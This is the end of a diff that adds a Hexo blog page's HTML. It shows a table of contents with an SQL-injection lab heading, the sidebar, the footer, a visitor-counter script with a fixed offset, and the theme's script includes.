nav-level-2"><a class="nav-link" href="#Less-5-%E5%8F%8C%E6%B3%A8%E5%85%A5GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">Less-5 双注入GET单引号字符型注入</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">10vexh</p>
+  <div class="site-description" itemprop="description">水至清则无鱼</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Sun Jan 02 2022 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">10vexh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
